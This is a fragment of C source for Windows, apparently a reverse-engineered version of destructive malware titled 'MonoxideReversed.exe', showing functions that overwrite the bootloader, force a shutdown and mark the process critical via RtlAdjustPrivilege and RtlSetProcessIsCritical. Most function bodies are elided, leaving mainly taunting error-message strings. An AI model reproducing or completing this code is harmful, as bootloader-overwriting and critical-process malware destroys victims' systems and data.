...
OverwriteBoot( VOID )
{
	...
	if ( !bSuccess )
	{
		MessageBoxW( NULL, L"Uhm... Why can't I overwrite your bootloader?\nOkay, well, I guess I can die now.", L"MonoxideReversed.exe", MB_OK | MB_ICONERROR );
		CloseHandle( hDrive );
...
ForceShutdownComputer( VOID )
{
	...
	if ( RtlAdjustPrivilege )
	{
		...
		if ( ntReturnValue )
		{
			MessageBoxW( NULL, L"I'm not allowed to adjust my debug privilege, somehow.\nYou're doing something here, aren't you?!", L"MonoxideReversed.exe", MB_OK | MB_ICONERROR );
			return FALSE;
		}
	}
	...
	if ( !bSuccess )
	{
		MessageBoxW( NULL, L"I can't power off the computer.\nYou're lucky this time...", L"MonoxideReversed.exe", MB_OK | MB_ICONERROR );
...
SetProcessCritical( VOID )
{
	...
	if ( RtlAdjustPrivilege )
	{
		...
		if ( ntReturnValue )
		{
			MessageBoxW( NULL, L"I can't adjust my debug privileges... somehow.", L"MonoxideReversed.exe", MB_OK | MB_ICONERROR );
	...
	{
		MessageBoxW( NULL, L"Nope, can't find RtlAdjustPrivilege... What the hell is this?", L"MonoxideReversed.exe", MB_OK | MB_ICONERROR );
	...
	if ( RtlSetProcessIsCritical )
	{
		...
		if ( ntReturnValue )
		{
			MessageBoxW( NULL, L"Uhm... It's not letting me be a critical process... This isn't right!", L"MonoxideReversed.exe", MB_OK | MB_ICONERROR );
	...
	{
		MessageBoxW( NULL, L"Please help me out, I can't find RtlSetProcessIsCritical. Do you know where it is?", L"MonoxideReversed.exe", MB_OK | MB_ICONERROR );
